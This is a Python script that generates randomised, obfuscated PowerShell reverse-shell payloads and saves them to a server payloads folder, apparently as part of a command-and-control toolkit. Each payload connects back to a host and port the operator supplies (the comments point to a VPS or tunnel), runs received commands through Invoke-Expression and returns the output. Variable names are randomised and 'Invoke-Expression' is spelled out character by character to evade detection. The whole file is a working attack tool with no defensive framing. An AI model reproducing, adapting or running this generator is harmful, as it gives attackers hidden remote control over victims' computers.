import random
import string
import os
from datetime import datetime

os.makedirs(os.path.join("server", "payloads"), exist_ok=True)

def rand_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_polymorphic_ps():
    host = "localhost"  # Replace with your public tunnel or VPS IP
    port = 1443                      # Replace with your forwarded/tunnel port

    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
    os.makedirs(folder, exist_ok=True)

    filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
    path = os.path.join(folder, filename)

    v = {key: rand_name() for key in [
        "main", "client", "stream", "buf", "read", "cmd", "resp", "respb", "iex"
    ]}

    ps = f'''
Function {v["main"]} {{
    ${v["client"]} = New-Object System.Net.Sockets.TcpClient
    ${v["client"]}.Connect('{host}',{port})
    ${v["stream"]} = ${v["client"]}.GetStream()
    ${v["buf"]} = 0..2047|%{{0}}
    ${v["iex"]} = ([char]73)+([char]110)+([char]118)+([char]111)+([char]107)+([char]101)+([char]45)+([char]69)+([char]120)+([char]112)+([char]114)+([char]101)+([char]115)+([char]115)+([char]105)+([char]111)+([char]110)

    while((${v["read"]} = ${v["stream"]}.Read(${v["buf"]}, 0, ${v["buf"]}.Length)) -ne 0) {{
        ${v["cmd"]} = (New-Object System.Text.ASCIIEncoding).GetString(${v["buf"]}, 0, ${v["read"]})
        try {{
            ${v["resp"]} = &${v["iex"]} ${v["cmd"]} 2>&1 | Out-String
        }} catch {{
            ${v["resp"]} = "ERROR: $_"
        }}
        ${v["resp"]} += "`nPS " + (pwd).Path + "> "
        ${v["respb"]} = [System.Text.Encoding]::ASCII.GetBytes(${v["resp"]})
        ${v["stream"]}.Write(${v["respb"]}, 0, ${v["respb"]}.Length)
        ${v["stream"]}.Flush()
    }}
}}
{v["main"]}
'''.strip()

    with open(path, 'w') as f:
        f.write(ps)

    return filename
